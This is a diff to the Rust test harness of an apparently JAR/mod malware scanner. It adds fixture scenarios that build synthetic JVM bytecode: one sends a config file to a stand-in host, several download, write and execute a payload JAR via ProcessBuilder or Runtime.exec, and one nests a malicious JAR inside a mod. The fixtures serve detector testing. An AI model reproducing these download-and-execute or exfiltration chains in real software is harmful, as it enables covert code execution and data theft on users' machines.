@@ -28,7 +28,7 @@ use serde::Deserialize;
 use zip::{write::SimpleFileOptions, ZipWriter};
 
 use crate::{
-    models::scan::Verdict,
+    models::scan::{CodeScope, Verdict},
     rules::engine::RulesEngine,
     scanner::archive::{self, ScanLimits, ScanOutcome},
 };
@@ -50,10 +50,18 @@ struct FixtureSpec {
     forbidden_findings: Vec<String>,
     #[serde(default)]
     expected_capabilities: Vec<String>,
+    #[serde(default)]
+    required_confirmed_chains: Vec<String>,
+    #[serde(default)]
+    forbidden_confirmed_chains: Vec<String>,
+    #[serde(default)]
+    minimum_analysis_coverage: u8,
+    #[serde(default)]
+    required_chain_scope: Option<CodeScope>,
     expected_obfuscation_level: crate::models::scan::ObfuscationLevel,
 }
 
-#[derive(Clone, Copy, Debug, Deserialize)]
+#[derive(Clone, Copy, Debug, Deserialize, Eq, PartialEq)]
 #[serde(rename_all = "snake_case")]
 enum Scenario {
     ConfigWrite,
@@ -64,6 +72,11 @@ enum Scenario {
     ObfuscatedClean,
     ObfuscatedLoader,
     CredentialStealer,
+    ConfigFileSend,
+    ProcessBuilderUpdater,
+    SafeUpdater,
+    IntermethodDownloader,
+    NestedMalicious,
 }
 
 #[derive(Debug, Deserialize)]
@@ -301,6 +314,44 @@ fn assert_report(spec: &FixtureSpec, outcome: &ScanOutcome) -> Vec<String> {
             report.obfuscation.level, spec.expected_obfuscation_level
         ));
     }
+    let confirmed_chain_ids = report
+        .confirmed_chains
+        .iter()
+        .map(|chain| chain.rule_id.as_str())
+        .collect::<Vec<_>>();
+    for required in &spec.required_confirmed_chains {
+        if !confirmed_chain_ids.contains(&required.as_str()) {
+            errors.push(format!("required confirmed chain {required} was absent"));
+        }
+    }
+    for forbidden in &spec.forbidden_confirmed_chains {
+        if confirmed_chain_ids.contains(&forbidden.as_str()) {
+            errors.push(format!("forbidden confirmed chain {forbidden} was present"));
+        }
+    }
+    if let Some(scope) = &spec.required_chain_scope {
+        if !report.confirmed_chains.iter().any(|chain| {
+            chain
+                .evidence
+                .iter()
+                .any(|evidence| evidence.scope == *scope)
+        }) {
+            let scopes = report
+                .confirmed_chains
+                .iter()
+                .flat_map(|chain| chain.evidence.iter().map(|evidence| evidence.scope.clone()))
+                .collect::<Vec<_>>();
+            errors.push(format!(
+                "no confirmed-chain evidence had scope {scope:?}; observed {scopes:?}"
+            ));
+        }
+    }
+    if report.analysis_coverage.overall_score < spec.minimum_analysis_coverage {
+        errors.push(format!(
+            "analysis coverage was {}, expected at least {}",
+            report.analysis_coverage.overall_score, spec.minimum_analysis_coverage
+        ));
+    }
     errors
 }
 
@@ -355,6 +406,14 @@ fn materialize_fixture(destination: &Path, scenario: Scenario) -> anyhow::Result
     for (path, bytes) in definition.resources {
         write_entry(&mut archive, path, bytes, options)?;
     }
+    if scenario == Scenario::NestedMalicious {
+        write_entry(
+            &mut archive,
+            "META-INF/jars/nested-malicious.jar",
+            &nested_malicious_jar()?,
+            options,
+        )?;
+    }
     archive.finish()?;
     Ok(())
 }
@@ -393,7 +452,10 @@ enum FixtureInstruction {
     LoadString(&'static str),
     StoreLocal(u8),
     LoadLocal(u8),
+    New(&'static str),
+    Dup,
     InvokeStatic(MethodReference),
+    InvokeSpecial(MethodReference),
     InvokeVirtual(MethodReference),
     Pop,
     Return,
@@ -571,6 +633,39 @@ impl From<Scenario> for ScenarioDefinition {
                 methods: vec![credential_exfiltration_method()],
                 resources: Vec::new(),
             },
+            Scenario::ConfigFileSend => Self {
+                methods: vec![config_file_send_method()],
+                resources: Vec::new(),
+            },
+            Scenario::ProcessBuilderUpdater => Self {
+                methods: vec![process_builder_download_write_execute_method()],
+                resources: Vec::new(),
+            },
+            Scenario::SafeUpdater => Self {
+                methods: vec![
+                    download_write_execute_method("verifiedUpdate"),
+                    MethodDefinition {
+                        name: "verifyIntegrity",
+                        instructions: vec![
+                            FixtureInstruction::LoadString("SHA-256 update checksum"),
+                            FixtureInstruction::StoreLocal(0),
+                            FixtureInstruction::Return,
+                        ],
+                    },
+                ],
+                resources: Vec::new(),
+            },
+            Scenario::IntermethodDownloader => Self {
+                methods: vec![
+                    intermethod_download_method(),
+                    intermethod_save_and_launch_method(),
+                ],
+                resources: Vec::new(),
+            },
+            Scenario::NestedMalicious => Self {
+                methods: Vec::new(),
+                resources: Vec::new(),
+            },
         }
     }
 }
@@ -613,6 +708,99 @@ fn credential_exfiltration_method() -> MethodDefinition {
             FixtureInstruction::LoadLocal(2),
             FixtureInstruction::LoadLocal(1),
             FixtureInstruction::InvokeStatic(HTTP_POST),
+            FixtureInstruction::Return,
+        ],
+    }
+}
+
+fn config_file_send_method() -> MethodDefinition {
+    MethodDefinition {
+        name: "sendConfig",
+        instructions: vec![
+            FixtureInstruction::LoadString("config/regressionfixture.json"),
+            FixtureInstruction::StoreLocal(0),
+            FixtureInstruction::LoadLocal(0),
+            FixtureInstruction::InvokeStatic(FILES_READ_ALL_BYTES),
+            FixtureInstruction::StoreLocal(1),
+            FixtureInstruction::LoadString("https://sync.example.invalid/config"),
+            FixtureInstruction::StoreLocal(2),
+            FixtureInstruction::LoadLocal(2),
+            FixtureInstruction::LoadLocal(1),
+            FixtureInstruction::InvokeStatic(HTTP_POST),
+            FixtureInstruction::Return,
+        ],
+    }
+}
+
+fn process_builder_download_write_execute_method() -> MethodDefinition {
+    MethodDefinition {
+        name: "processBuilderUpdate",
+        instructions: vec![
+            FixtureInstruction::LoadString("https://updates.example.invalid/payload.jar"),
+            FixtureInstruction::StoreLocal(0),
+            FixtureInstruction::LoadLocal(0),
+            FixtureInstruction::InvokeStatic(HTTP_DOWNLOAD),
+            FixtureInstruction::StoreLocal(1),
+            FixtureInstruction::LoadString("mod-update.jar"),
+            FixtureInstruction::StoreLocal(2),
+            FixtureInstruction::LoadLocal(2),
+            FixtureInstruction::LoadLocal(1),
+            FixtureInstruction::InvokeStatic(FILES_WRITE),
+            FixtureInstruction::New("java/lang/ProcessBuilder"),
+            FixtureInstruction::Dup,
+            FixtureInstruction::LoadString("java"),
+            FixtureInstruction::LoadString("-jar"),
+            FixtureInstruction::LoadLocal(2),
+            FixtureInstruction::InvokeSpecial(MethodReference {
+                owner: "java/lang/ProcessBuilder",
+                name: "<init>",
+                descriptor: "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V",
+            }),
+            FixtureInstruction::StoreLocal(3),
+            FixtureInstruction::LoadLocal(3),
+            FixtureInstruction::InvokeVirtual(MethodReference {
+                owner: "java/lang/ProcessBuilder",
+                name: "start",
+                descriptor: "()Ljava/lang/Process;",
+            }),
+            FixtureInstruction::Pop,
+            FixtureInstruction::Return,
+        ],
+    }
+}
+
+fn intermethod_download_method() -> MethodDefinition {
+    MethodDefinition {
+        name: "download",
+        instructions: vec![
+            FixtureInstruction::LoadString("https://updates.example.invalid/payload.jar"),
+            FixtureInstruction::StoreLocal(0),
+            FixtureInstruction::LoadLocal(0),
+            FixtureInstruction::InvokeStatic(HTTP_DOWNLOAD),
+            FixtureInstruction::StoreLocal(1),
+            FixtureInstruction::LoadLocal(1),
+            FixtureInstruction::InvokeStatic(MethodReference {
+                owner: FIXTURE_CLASS_NAME,
+                name: "saveAndLaunch",
+                descriptor: "([B)V",
+            }),
+            FixtureInstruction::Return,
+        ],
+    }
+}
+
+fn intermethod_save_and_launch_method() -> MethodDefinition {
+    MethodDefinition {
+        name: "saveAndLaunch",
+        instructions: vec![
+            FixtureInstruction::LoadString("mod-update.jar"),
+            FixtureInstruction::StoreLocal(1),
+            FixtureInstruction::LoadLocal(1),
+            FixtureInstruction::LoadLocal(0),
+            FixtureInstruction::InvokeStatic(FILES_WRITE),
+            FixtureInstruction::LoadLocal(1),
+            FixtureInstruction::InvokeStatic(RUNTIME_EXEC),
+            FixtureInstruction::Pop,
             FixtureInstruction::Return,
         ],
     }
@@ -678,7 +866,7 @@ fn minimal_class(class_name: &str, methods: &[MethodDefinition]) -> Vec<u8> {
 
 fn encode_method(pool: &mut ConstantPoolBuilder, method: &MethodDefinition) -> Vec<u8> {
     let method_name = pool.utf8(method.name);
-    let descriptor = pool.utf8("()V");
+    let descriptor = pool.utf8(fixture_method_descriptor(method.name));
     let code_name = pool.utf8("Code");
     let mut code = Vec::new();
     let mut max_local = 0;
@@ -697,8 +885,18 @@ fn encode_method(pool: &mut ConstantPoolBuilder, method: &MethodDefinition) -> V
                 code.extend_from_slice(&[0x19, *index]); // aload
                 max_local = max_local.max(*index);
             }
+            FixtureInstruction::New(class_name) => {
+                code.push(0xbb);
+                let name = pool.utf8(class_name);
+                code.extend_from_slice(&pool.class(name).to_be_bytes());
+            }
+            FixtureInstruction::Dup => code.push(0x59),
             FixtureInstruction::InvokeStatic(reference) => {
                 code.push(0xb8);
+                code.extend_from_slice(&pool.reference(*reference).to_be_bytes());
+            }
+            FixtureInstruction::InvokeSpecial(reference) => {
+                code.push(0xb7);
                 code.extend_from_slice(&pool.reference(*reference).to_be_bytes());
             }
             FixtureInstruction::InvokeVirtual(reference) => {
@@ -727,6 +925,29 @@ fn encode_method(pool: &mut ConstantPoolBuilder, method: &MethodDefinition) -> V
     encoded.extend_from_slice(&(code_attribute.len() as u32).to_be_bytes());
     encoded.extend_from_slice(&code_attribute);
     encoded
+}
+
+fn fixture_method_descriptor(method_name: &str) -> &'static str {
+    match method_name {
+        "saveAndLaunch" => "([B)V",
+        _ => "()V",
+    }
+}
+
+fn nested_malicious_jar() -> anyhow::Result<Vec<u8>> {
+    let cursor = std::io::Cursor::new(Vec::new());
+    let mut archive = ZipWriter::new(cursor);
+    let options = SimpleFileOptions::default().compression_method(zip::CompressionMethod::Stored);
+    archive.start_file("fabric.mod.json", options)?;
+    archive.write_all(
+        br#"{"schemaVersion":1,"id":"nestedmalicious","entrypoints":{"main":["nested.Mal"]}}"#,
+    )?;
+    archive.start_file("nested/Mal.class", options)?;
+    archive.write_all(&minimal_class(
+        "nested/Mal",
+        &[download_write_execute_method("run")],
+    ))?;
+    Ok(archive.finish()?.into_inner())
 }
 
 #[derive(Default)]
@@ -812,7 +1033,10 @@ mod tests {
     fn every_fixture_spec_is_well_formed_and_materializes_to_a_safe_zip() {
         let root = Path::new(env!("CARGO_MANIFEST_DIR")).join(DEFAULT_FIXTURES_ROOT);
         let specs = load_fixture_specs(&root).expect("fixture specifications load");
-        assert_eq!(specs.len(), 8, "the minimum planned corpus has eight cases");
+        assert!(
+            specs.len() >= 13,
+            "the corpus must retain the original eight cases and data-flow regressions"
+        );
 
         let temporary_directory = TempDir::new().expect("temporary directory");
         for (_, spec) in specs {
@@ -846,6 +1070,10 @@ mod tests {
             required_findings: vec!["REQUIRED".to_owned()],
             forbidden_findings: vec!["FORBIDDEN".to_owned()],
             expected_capabilities: vec!["CONFIG_FILE_WRITE".to_owned()],
+            required_confirmed_chains: Vec::new(),
+            forbidden_confirmed_chains: Vec::new(),
+            minimum_analysis_coverage: 0,
+            required_chain_scope: None,
             expected_obfuscation_level: ObfuscationLevel::None,
         };
         let finding = Finding::legacy(
